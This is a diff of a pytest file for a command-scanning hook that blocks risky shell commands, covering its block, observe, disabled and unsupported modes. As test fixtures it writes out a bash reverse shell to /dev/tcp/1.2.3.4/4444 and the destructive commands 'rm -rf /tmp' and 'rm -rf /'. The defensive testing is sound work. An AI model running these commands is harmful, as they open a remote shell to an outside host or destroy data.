@@ -2,7 +2,7 @@
 
 Coverage targets:
   - Fail-open paths (invalid JSON, empty command, subprocess errors)
-  - Mode-based decisions (observe vs deny)
+  - Mode-based decisions (observe vs block)
   - Self-protect rule handling (always blocks regardless of mode)
   - Output formatting (_block, _block_self_protect)
   - Trace context injection
@@ -44,8 +44,8 @@ _HOOK_SCRIPT = os.path.join(_HOOKS_DIR, "code_scanner_hook.py")
 # ---------------------------------------------------------------------------
 
 
-def _run_hook(input_data, *, env_override=None):
-    """Run code_scanner_hook.py as subprocess and return parsed JSON output."""
+def _run_hook_process(input_data, *, env_override=None):
+    """Run code_scanner_hook.py as subprocess and return the process."""
     env = os.environ.copy()
     if env_override:
         env.update(env_override)
@@ -60,6 +60,12 @@ def _run_hook(input_data, *, env_override=None):
         env=env,
     )
     assert proc.returncode == 0, f"Hook crashed: stderr={proc.stderr}"
+    return proc
+
+
+def _run_hook(input_data, *, env_override=None):
+    """Run code_scanner_hook.py as subprocess and return parsed JSON output."""
+    proc = _run_hook_process(input_data, env_override=env_override)
     if not proc.stdout.strip():
         return {}
     return json.loads(proc.stdout)
@@ -162,6 +168,43 @@ class TestFailOpen:
 class TestObserveMode:
     """In observe mode, even dangerous commands are allowed."""
 
+    def test_hook_enabled_false_skips_scan(self, mock_cli):
+        env = mock_cli(
+            output=json.dumps(
+                {
+                    "verdict": "deny",
+                    "findings": [
+                        {"rule_id": "shell-reverse-shell", "desc_en": "Reverse shell"}
+                    ],
+                }
+            ),
+            extra={"CODE_SCANNER_HOOK_ENABLED": "false", "CODE_SCANNER_MODE": "deny"},
+        )
+        output = _run_hook(
+            {"tool_input": {"command": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"}},
+            env_override=env,
+        )
+        assert output == {}
+
+    def test_invalid_hook_enabled_value_defaults_to_enabled_silently(self, mock_cli):
+        env = mock_cli(
+            output=json.dumps(
+                {
+                    "verdict": "deny",
+                    "findings": [
+                        {"rule_id": "shell-reverse-shell", "desc_en": "Reverse shell"}
+                    ],
+                }
+            ),
+            extra={"CODE_SCANNER_HOOK_ENABLED": "maybe", "CODE_SCANNER_MODE": "deny"},
+        )
+        output = _run_hook(
+            {"tool_input": {"command": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"}},
+            env_override=env,
+        )
+        assert output["decision"] == "block"
+        assert "shell-reverse-shell" in output["reason"]
+
     def test_warn_verdict_allows_in_observe(self, mock_cli):
         env = mock_cli(
             output=json.dumps(
@@ -199,13 +242,13 @@ class TestObserveMode:
         assert output == {}
 
 
-class TestDenyMode:
-    """In deny mode, warn/deny verdicts trigger block."""
+class TestBlockMode:
+    """In block mode, warn/deny verdicts trigger block."""
 
     def test_pass_verdict_allows(self, mock_cli):
         env = mock_cli(
             output=json.dumps({"verdict": "pass", "findings": []}),
-            extra={"CODE_SCANNER_MODE": "deny"},
+            extra={"CODE_SCANNER_MODE": "block"},
         )
         output = _run_hook(
             {"tool_input": {"command": "echo hello"}},
@@ -234,7 +277,7 @@ class TestDenyMode:
                     ],
                 }
             ),
-            extra={"CODE_SCANNER_MODE": "deny"},
+            extra={"CODE_SCANNER_MODE": "block"},
         )
         output = _run_hook(
             {"tool_input": {"command": "rm -rf /tmp"}},
@@ -338,10 +381,11 @@ class TestSelfProtect:
         assert "自我保护" in output["reason"]
 
 
-class TestUnknownMode:
-    """Unknown mode acts as fail-open."""
+class TestUnsupportedMode:
+    """Unsupported modes are equivalent to an unset MODE."""
 
-    def test_unknown_mode_allows(self, mock_cli):
+    @pytest.mark.parametrize("mode", ["banana", "ask", "warn"])
+    def test_unsupported_mode_allows_with_stderr_diagnostic(self, mock_cli, mode):
         env = mock_cli(
             output=json.dumps(
                 {
@@ -349,7 +393,27 @@ class TestUnknownMode:
                     "findings": [{"rule_id": "shell-recursive-delete", "desc_zh": "x"}],
                 }
             ),
-            extra={"CODE_SCANNER_MODE": "banana"},
+            extra={"CODE_SCANNER_MODE": mode},
+        )
+        proc = _run_hook_process(
+            {"tool_input": {"command": "rm -rf /tmp"}},
+            env_override=env,
+        )
+        output = json.loads(proc.stdout) if proc.stdout.strip() else {}
+        assert output == {}
+        assert "CODE_SCANNER_MODE" in proc.stderr
+        assert mode in proc.stderr
+        assert "rm -rf /tmp" not in proc.stderr
+
+    def test_debug_alias_allows(self, mock_cli):
+        env = mock_cli(
+            output=json.dumps(
+                {
+                    "verdict": "deny",
+                    "findings": [{"rule_id": "shell-recursive-delete", "desc_zh": "x"}],
+                }
+            ),
+            extra={"CODE_SCANNER_MODE": "debug"},
         )
         output = _run_hook(
             {"tool_input": {"command": "rm -rf /tmp"}},
@@ -366,7 +430,7 @@ class TestUnknownMode:
 class TestMainMonkeypatch:
     """Test main() directly with monkeypatched subprocess and stdin."""
 
-    def _run_main(self, monkeypatch, capsys, input_data, *, mode="deny"):
+    def _run_main(self, monkeypatch, capsys, input_data, *, mode="block"):
         monkeypatch.setenv("CODE_SCANNER_MODE", mode)
         # Force reload of module-level MODE
         monkeypatch.setattr(code_scanner_hook, "MODE", mode)
@@ -439,8 +503,8 @@ class TestMainMonkeypatch:
         self._run_main(monkeypatch, capsys, {"tool_input": {"command": "echo hi"}})
         assert captured["timeout"] == 15
 
-    def test_deny_mode_blocks_with_findings(self, monkeypatch, capsys):
-        """deny mode + warn verdict → _block() called."""
+    def test_block_mode_blocks_with_findings(self, monkeypatch, capsys):
+        """block mode + warn verdict → _block() called."""
 
         def fake_run(args, **kwargs):
             return subprocess.CompletedProcess(
@@ -462,14 +526,14 @@ class TestMainMonkeypatch:
 
         monkeypatch.setattr(code_scanner_hook.subprocess, "run", fake_run)
         output = self._run_main(
-            monkeypatch, capsys, {"tool_input": {"command": "rm -rf /"}}, mode="deny"
+            monkeypatch, capsys, {"tool_input": {"command": "rm -rf /"}}, mode="block"
         )
         assert output["decision"] == "block"
         assert "1 个风险项" in output["reason"]
         assert "shell-recursive-delete" in output["reason"]
 
-    def test_deny_mode_blocks_multiple_findings(self, monkeypatch, capsys):
-        """deny mode + multiple findings → all listed."""
+    def test_block_mode_blocks_multiple_findings(self, monkeypatch, capsys):
+        """block mode + multiple findings → all listed."""
 
         def fake_run(args, **kwargs):
             return subprocess.CompletedProcess(
@@ -489,7 +553,7 @@ class TestMainMonkeypatch:
 
         monkeypatch.setattr(code_scanner_hook.subprocess, "run", fake_run)
         output = self._run_main(
-            monkeypatch, capsys, {"tool_input": {"command": "bad cmd"}}, mode="deny"
+            monkeypatch, capsys, {"tool_input": {"command": "bad cmd"}}, mode="block"
         )
         assert output["decision"] == "block"
         assert "2 个风险项" in output["reason"]
